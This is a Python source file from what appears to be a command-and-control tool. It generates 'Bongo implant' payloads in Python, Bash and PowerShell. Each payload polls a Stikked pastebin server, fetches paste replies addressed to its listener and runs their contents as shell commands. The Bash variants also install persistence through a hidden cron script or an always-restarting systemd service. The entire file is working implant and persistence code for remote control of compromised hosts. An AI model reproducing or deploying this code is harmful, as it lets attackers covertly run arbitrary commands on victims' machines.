import enum
import os
import textwrap
import datetime

from src.serverSettings import *
from src.listeners import *
from src.serverInterface import *

PAYLOADS_DIR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
    "extras", "Payloads"
)


class TargetType(enum.Enum):
    python = "python"
    powershell = "powershell"
    bash = "bash"


# ---------------------------------------------------------------------------
# Payload content builders
# ---------------------------------------------------------------------------

def _python_payload(stikked_base, listener_id, listener_name, interval):
    return textwrap.dedent(f"""\
        import html
        import subprocess
        import time
        import requests

        STIKKED_BASE   = "{stikked_base}"
        LISTENER_ID    = "{listener_id}"
        LISTENER_NAME  = "{listener_name}"
        POLL_INTERVAL  = {interval}

        def get_url(path):
            return STIKKED_BASE + "/" + path.lstrip("/")

        def get_reply_ids():
            resp = requests.get(get_url("/api/recent"))
            resp.raise_for_status()
            return [p["pid"] for p in resp.json()
                    if p.get("title") == "RE: " + LISTENER_NAME]

        def get_paste_raw(pid):
            resp = requests.get(get_url("/api/paste/" + pid))
            resp.raise_for_status()
            return html.unescape(resp.json().get("raw", ""))

        def run_commands(raw_text):
            for line in raw_text.splitlines():
                line = line.strip()
                if line:
                    subprocess.run(line, shell=True)

        seen_pids = set()

        while True:
            try:
                for pid in get_reply_ids():
                    if pid not in seen_pids:
                        seen_pids.add(pid)
                        run_commands(get_paste_raw(pid))
            except Exception:
                pass
            time.sleep(POLL_INTERVAL)
    """)


def _bash_loop_payload(stikked_base, listener_name, interval):
    return textwrap.dedent(f"""\
        #!/bin/bash
        STIKKED_BASE="{stikked_base}"
        LISTENER_NAME="{listener_name}"
        POLL_INTERVAL={interval}
        declare -A seen_pids

        while true; do
            reply_ids=$(curl -s "$STIKKED_BASE/api/recent" | python3 -c "
        import sys, json
        data = json.load(sys.stdin)
        for p in data:
            if p.get('title') == 'RE: {listener_name}':
                print(p['pid'])
        ")
            for pid in $reply_ids; do
                if [[ -z "${{seen_pids[$pid]}}" ]]; then
                    seen_pids[$pid]=1
                    commands=$(curl -s "$STIKKED_BASE/api/paste/$pid" | python3 -c "
        import sys, json, html
        print(html.unescape(json.load(sys.stdin).get('raw', '')))
        ")
                    while IFS= read -r cmd; do
                        [[ -n "$cmd" ]] && bash -c "$cmd"
                    done <<< "$commands"
                fi
            done
            sleep "$POLL_INTERVAL"
        done
    """)


def _bash_cron_payload(stikked_base, listener_name, interval_minutes):
    inner = textwrap.dedent(f"""\
        #!/bin/bash
        STIKKED_BASE="{stikked_base}"
        LISTENER_NAME="{listener_name}"
        SEEN_FILE="/tmp/.bongo_seen_{listener_name}"
        touch "$SEEN_FILE"

        reply_ids=$(curl -s "$STIKKED_BASE/api/recent" | python3 -c "
        import sys, json
        data = json.load(sys.stdin)
        for p in data:
            if p.get('title') == 'RE: {listener_name}':
                print(p['pid'])
        ")
        for pid in $reply_ids; do
            if ! grep -qx "$pid" "$SEEN_FILE"; then
                echo "$pid" >> "$SEEN_FILE"
                commands=$(curl -s "$STIKKED_BASE/api/paste/$pid" | python3 -c "
        import sys, json, html
        print(html.unescape(json.load(sys.stdin).get('raw', '')))
        ")
                while IFS= read -r cmd; do
                    [[ -n "$cmd" ]] && bash -c "$cmd"
                done <<< "$commands"
            fi
        done
    """)
    installer = textwrap.dedent(f"""\
        #!/bin/bash
        # Cron installer — interval: every {interval_minutes} minute(s)
        SCRIPT_PATH="$HOME/.bongo_{listener_name}.sh"

        cat > "$SCRIPT_PATH" << 'ENDOFSCRIPT'
        {inner}
        ENDOFSCRIPT

        chmod +x "$SCRIPT_PATH"
        (crontab -l 2>/dev/null; echo "*/{interval_minutes} * * * * $SCRIPT_PATH") | crontab -
        echo "Cron job installed: $SCRIPT_PATH"
    """)
    return installer


def _bash_service_payload(stikked_base, listener_name, interval):
    return textwrap.dedent(f"""\
        #!/bin/bash
        # Service installer for systemd
        SERVICE_NAME="bongo_{listener_name}"
        SCRIPT_PATH="/opt/$SERVICE_NAME.sh"
        SERVICE_PATH="/etc/systemd/system/$SERVICE_NAME.service"

        cat > "$SCRIPT_PATH" << 'ENDOFSCRIPT'
        {_bash_loop_payload(stikked_base, listener_name, interval)}
        ENDOFSCRIPT

        chmod +x "$SCRIPT_PATH"

        cat > "$SERVICE_PATH" << ENDOFSERVICE
        [Unit]
        Description=Bongo implant ($SERVICE_NAME)
        After=network.target

        [Service]
        ExecStart=/bin/bash $SCRIPT_PATH
        Restart=always
        RestartSec=5

        [Install]
        WantedBy=multi-user.target
        ENDOFSERVICE

        systemctl daemon-reload
        systemctl enable --now $SERVICE_NAME
        echo "Service installed and started: $SERVICE_NAME"
    """)


def _powershell_payload(stikked_base, listener_id, listener_name, interval):
    return textwrap.dedent(f"""\
        $STIKKED_BASE  = "{stikked_base}"
        $LISTENER_ID   = "{listener_id}"
        $LISTENER_NAME = "{listener_name}"
        $POLL_INTERVAL = {interval}
        $seen_pids     = @()

        while ($true) {{
            try {{
                $recent    = Invoke-RestMethod -Uri "$STIKKED_BASE/api/recent"
                $reply_ids = $recent |
                    Where-Object {{ $_.title -eq "RE: $LISTENER_NAME" }} |
                    Select-Object -ExpandProperty pid

                foreach ($pid in $reply_ids) {{
                    if ($seen_pids -notcontains $pid) {{
                        $seen_pids += $pid
                        $paste = Invoke-RestMethod -Uri "$STIKKED_BASE/api/paste/$pid"
                        $raw   = [System.Net.WebUtility]::HtmlDecode($paste.raw)

                        foreach ($line in $raw.Split("`n")) {{
                            $line = $line.Trim()
                            if ($line) {{
                                Write-Host "> $line"
                                try {{
                                    $output = Invoke-Expression $line 2>&1
                                    if ($output) {{ Write-Host $output }}
                                }} catch {{
                                    Write-Host "[error] $($_.Exception.Message)"
                                }}
                            }}
                        }}
                    }}
                }}
            }} catch {{
                Write-Host "[poll error] $($_.Exception.Message)"
            }}
            Start-Sleep -Seconds $POLL_INTERVAL
        }}
    """)


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------

def generatePayload():
    listeners = getListeners()
    if not listeners:
        print("No listeners found. Create a listener first.")
        return

    displayList(listeners)
    listener_id = input("Select Listener by ID: ").strip()
    listener = getListenerById(listener_id)
    if listener is None:
        print("Error: No listener found with that ID.")
        return

    stikked_base = getSettings()["stikked_address"].rstrip("/")
    listener_name = listener["name"]

    print("\nTarget type:\n 1 - Python\n 2 - Bash\n 3 - PowerShell")
    type_sel = input("Type: ").strip()

    if type_sel == "1":
        target = TargetType.python
    elif type_sel == "2":
        target = TargetType.bash
    elif type_sel == "3":
        target = TargetType.powershell
    else:
        print("Invalid selection.")
        return

    interval_raw = input("Poll interval in seconds: ").strip()
    if not interval_raw.isdigit():
        print("Interval must be a number.")
        return
    interval = int(interval_raw)

    if target == TargetType.bash:
        print("\nBash payload type:\n 1 - Looping script\n 2 - Cron job installer\n 3 - Systemd service installer")
        bash_sel = input("Type: ").strip()
        if bash_sel == "1":
            content = _bash_loop_payload(stikked_base, listener_name, interval)
            ext = "sh"
        elif bash_sel == "2":
            interval_min = max(1, interval // 60)
            content = _bash_cron_payload(stikked_base, listener_name, interval_min)
            ext = "sh"
        elif bash_sel == "3":
            content = _bash_service_payload(stikked_base, listener_name, interval)
            ext = "sh"
        else:
            print("Invalid selection.")
            return
    elif target == TargetType.python:
        content = _python_payload(stikked_base, listener_id, listener_name, interval)
        ext = "py"
    else:
        content = _powershell_payload(stikked_base, listener_id, listener_name, interval)
        ext = "ps1"

    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{listener_id}_payload_{timestamp}.{ext}"
    os.makedirs(PAYLOADS_DIR, exist_ok=True)
    filepath = os.path.join(PAYLOADS_DIR, filename)

    with open(filepath, "w") as f:
        f.write(content)

    print(f"Payload saved: {filepath}")
